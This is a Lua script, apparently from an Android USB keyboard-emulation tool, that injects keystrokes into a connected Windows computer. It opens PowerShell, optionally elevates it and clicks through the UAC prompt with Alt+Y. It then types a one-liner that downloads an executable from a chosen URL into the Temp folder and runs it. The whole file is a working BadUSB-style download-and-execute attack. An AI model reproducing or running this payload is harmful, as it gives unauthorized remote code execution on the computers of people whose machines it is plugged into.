---
--- Created by netdex.
--- DateTime: 12/30/17 10:12 PM
---
--- downloadrun.lua: downloads and executes a file
--- directly translated from the Java version in previous builds
---

local file = ask("File to download?", "http://www.greyhathacker.net/tools/messbox.exe")
local runAs = should("Task UAC", "Launch exec. as admin?");

while not cancelled() do
    progress("IDLE")

    -- poll until /dev/hidg0 is writable
    while not cancelled() and test() ~= 0 do
        delay(1000)
    end
    if cancelled() then
        break
    end

    progress("RUNNING")
    delay(1000)

    log("opening powershell, runAs=" .. runAs)
    if runAs then
        -- when running elevated prompt sometimes it pops in background, so we need
        -- to go to the desktop
        press_keys(kb.LSUPER, kb.D)
        delay(500)
        press_keys(kb.LSUPER, kb.R)
        delay(2000)
        send_string("powershell Start-Process powershell -Verb runAs\n")
        delay(2000)
        press_keys(kb.LALT, kb.Y)
        delay(2000)
    else
        press_keys(kb.LSUPER, kb.R)
        delay(2000)
        send_string("powershell\n")
        delay(2000)
    end
    
    log("download + execute code")

    send_string(
    "$d=New-Object System.Net.WebClient;" ..
    "$u='" .. file .. "';" ..
    "$f=\"$Env:Temp\\a.exe\";$d.DownloadFile($u,$f);" ..
    "$e=New-Object -com shell.application;" ..
    "$e.shellexecute($f);" ..
    "exit;\n"
    )

    progress("DONE")
    while not cancelled() and test() == 0 do
        delay(1000)
    end
    log("disconnected")
end

